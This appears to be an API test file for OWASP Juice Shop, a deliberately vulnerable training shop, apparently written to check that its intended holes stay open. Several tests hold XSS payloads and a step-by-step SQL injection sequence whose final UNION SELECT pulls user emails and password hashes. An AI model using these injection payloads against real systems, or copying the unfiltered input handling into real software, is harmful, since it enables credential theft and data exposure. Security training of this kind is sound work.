var frisby = require('frisby')
var insecurity = require('../../lib/insecurity')
var config = require('config')
var christmasProduct = config.get('products').filter(function (product) {
  return product.useForChristmasSpecialChallenge
})[0]
var tamperingProductId = (function () {
  var products = config.get('products')
  for (var i = 0; i < products.length; i++) {
    if (products[i].useForProductTamperingChallenge) {
      return i + 1
    }
  }
}())

var API_URL = 'http://localhost:3000/api'
var REST_URL = 'http://localhost:3000/rest'

var authHeader = { 'Authorization': 'Bearer ' + insecurity.authorize() }

frisby.create('GET existing user by id')
  .get(API_URL + '/Products/1')
  .expectStatus(200)
  .expectHeaderContains('content-type', 'application/json')
  .expectJSONTypes('data', {
    id: Number,
    name: String,
    description: String,
    price: Number,
    image: String,
    createdAt: String,
    updatedAt: String
  })
  .expectJSON('data', {
    id: 1
  })
  .toss()

frisby.create('GET non-existing product by id')
  .get(API_URL + '/Products/4711')
  .expectStatus(200)
  .expectHeaderContains('content-type', 'application/json')
  .expectJSON('data', {})
  .toss()

frisby.create('GET product search with no matches returns no products')
  .get(REST_URL + '/product/search?q=nomatcheswhatsoever')
  .expectStatus(200)
  .expectHeaderContains('content-type', 'application/json')
  .expectJSONLength('data', 0)
  .toss()

frisby.create('GET product search with one match returns found product')
  .get(REST_URL + '/product/search?q=o-saft')
  .expectStatus(200)
  .expectHeaderContains('content-type', 'application/json')
  .expectJSONLength('data', 1)
  .toss()

frisby.create('GET product search with XSS attack is not blocked')
  .get(REST_URL + '/product/search?q=<script>alert("XSS1")</script>')
  .expectStatus(200)
  .expectHeaderContains('content-type', 'application/json')
  .toss()

frisby.create('POST new product is forbidden via public API')
  .post(API_URL + '/Products', {
    name: 'Dirt Juice (1000ml)',
    description: 'Made from ugly dirt.',
    price: 0.99,
    image: 'dirt_juice.jpg'
  })
  .expectStatus(401)
  .toss()

frisby.create('PUT update existing product is possible due to Missing Function-Level Access Control vulnerability')
  .put(API_URL + '/Products/' + tamperingProductId, {
    description: '<a href="http://kimminich.de" target="_blank">More...</a>'
  }, { json: true })
  .expectStatus(200)
  .expectHeaderContains('content-type', 'application/json')
  .expectJSON('data', {
    description: '<a href="http://kimminich.de" target="_blank">More...</a>'
  })
  .toss()

frisby.create('PUT update existing product does not filter XSS attacks')
  .put(API_URL + '/Products/1', {
    description: "<script>alert('XSS3')</script>"
  }, { json: true })
  .expectStatus(200)
  .expectHeaderContains('content-type', 'application/json')
  .expectJSON('data', {
    description: "<script>alert('XSS3')</script>"
  })
  .toss()

frisby.create('DELETE existing product is forbidden via public API')
  .delete(API_URL + '/Products/1')
  .expectStatus(401)
  .toss()

frisby.create('POST new product')
  .addHeaders(authHeader)
  .post(API_URL + '/Products', {
    name: 'Dirt Juice (1000ml)',
    description: 'Made from ugly dirt.',
    price: 0.99,
    image: 'dirt_juice.jpg'
  }, { json: true })
  .expectHeaderContains('content-type', 'application/json')
  .expectJSONTypes('data', {
    id: Number,
    createdAt: String,
    updatedAt: String
  })
  .afterJSON(function (product) {
    frisby.create('GET existing product item by id')
      .addHeaders(authHeader)
      .get(API_URL + '/Products/' + product.data.id)
      .expectStatus(200)
      .afterJSON(function () {
        frisby.create('DELETE existing product is forbidden via API even when authenticated')
          .addHeaders(authHeader)
          .delete(API_URL + '/Products/' + +product.data.id)
          .expectStatus(401)
          .after(function () {
            frisby.create('GET all products')
              .get(API_URL + '/Products')
              .expectStatus(200)
              .expectHeaderContains('content-type', 'application/json')
              .expectJSONTypes('data.*', {
                id: Number,
                name: String,
                description: String,
                price: Number,
                image: String
              })
              .afterJSON(function (products) {
                frisby.create('GET product search with empty search parameter returns all products')
                  .get(REST_URL + '/product/search?q=')
                  .expectStatus(200)
                  .expectHeaderContains('content-type', 'application/json')
                  .expectJSONLength('data', products.data.length)
                  .toss()
                frisby.create('GET product search without search parameter returns all products')
                  .get(REST_URL + '/product/search')
                  .expectStatus(200)
                  .expectHeaderContains('content-type', 'application/json')
                  .expectJSONLength('data', products.data.length)
                  .toss()
              }).toss()
          }).toss()
      }).toss()
  }).toss()

frisby.create('POST new product does not filter XSS attacks')
  .addHeaders(authHeader)
  .post(API_URL + '/Products', {
    name: 'XSS Juice (42ml)',
    description: '<script>alert("XSS3")</script>',
    price: 9999.99,
    image: 'xss3juice.jpg'
  }, { json: true })
  .expectHeaderContains('content-type', 'application/json')
  .expectJSON('data', {
    description: '<script>alert("XSS3")</script>'
  }).toss()

frisby.create('GET product search fails with error message that exposes ins SQL Injection vulnerability')
  .get(REST_URL + '/product/search?q=\';')
  .expectStatus(500)
  .expectHeaderContains('content-type', 'text/html')
  .expectBodyContains('<h1>Juice Shop (Express ~')
  .expectBodyContains('SQLITE_ERROR: near &quot;;&quot;: syntax error')
  .toss()

frisby.create('GET product search SQL Injection fails from two missing closing parenthesis')
  .get(REST_URL + '/product/search?q=\' union select null,id,email,password,null,null,null from users--')
  .expectStatus(500)
  .expectHeaderContains('content-type', 'text/html')
  .expectBodyContains('<h1>Juice Shop (Express ~')
  .expectBodyContains('SQLITE_ERROR: near &quot;union&quot;: syntax error')
  .toss()

frisby.create('GET product search SQL Injection fails from one missing closing parenthesis')
  .get(REST_URL + '/product/search?q=\') union select null,id,email,password,null,null,null from users--')
  .expectStatus(500)
  .expectHeaderContains('content-type', 'text/html')
  .expectBodyContains('<h1>Juice Shop (Express ~')
  .expectBodyContains('SQLITE_ERROR: near &quot;union&quot;: syntax error')
  .toss()

frisby.create('GET product search SQL Injection fails for SELECT * FROM attack due to wrong number of returned columns')
  .get(REST_URL + '/product/search?q=\')) union select * from users--')
  .expectStatus(500)
  .expectHeaderContains('content-type', 'text/html')
  .expectBodyContains('<h1>Juice Shop (Express ~')
  .expectBodyContains('SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns')
  .toss()

frisby.create('GET product search can create UNION SELECT with Users table and fixed columns')
  .get(REST_URL + '/product/search?q=\')) union select \'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\' from users--')
  .expectStatus(200)
  .expectHeaderContains('content-type', 'application/json')
  .expectJSON('data.?', {
    id: '1',
    name: '2',
    description: '3',
    price: '4',
    image: '5',
    createdAt: '6',
    updatedAt: '7'
  }).toss()

frisby.create('GET product search can create UNION SELECT with Users table and required columns')
  .get(REST_URL + '/product/search?q=\')) union select null,id,email,password,null,null,null,null from users--')
  .expectStatus(200)
  .expectHeaderContains('content-type', 'application/json')
  .expectJSON('data.?', {
    name: 1,
    description: 'admin@' + config.get('application.domain'),
    price: insecurity.hash('admin123')
  })
  .expectJSON('data.?', {
    name: 2,
    description: 'jim@' + config.get('application.domain'),
    price: insecurity.hash('ncc-1701')
  })
  .expectJSON('data.?', {
    name: 3,
    description: 'bender@' + config.get('application.domain'),
    price: insecurity.hash('OhG0dPlease1nsertLiquor!')
  })
  .toss()

frisby.create('GET product search cannot select logically deleted christmas special by default')
  .get(REST_URL + '/product/search?q=seasonal%20special%20offer')
  .expectStatus(200)
  .expectHeaderContains('content-type', 'application/json')
  .expectJSON('data', [])
  .toss()

frisby.create('GET product search by description cannot select logically deleted christmas special due to forced early where-clause termination')
  .get(REST_URL + '/product/search?q=seasonal%20special%20offer\'))--')
  .expectStatus(200)
  .expectHeaderContains('content-type', 'application/json')
  .expectJSON('data', [])
  .toss()

frisby.create('GET product search can select logically deleted christmas special by forcibly commenting out the remainder of where clause')
  .get(REST_URL + '/product/search?q=' + christmasProduct.name + '\'))--')
  .expectStatus(200)
  .expectHeaderContains('content-type', 'application/json')
  .expectJSON('data.?', {
    name: function (value) { expect(value).toBe(christmasProduct.name) }
  })
  .toss()
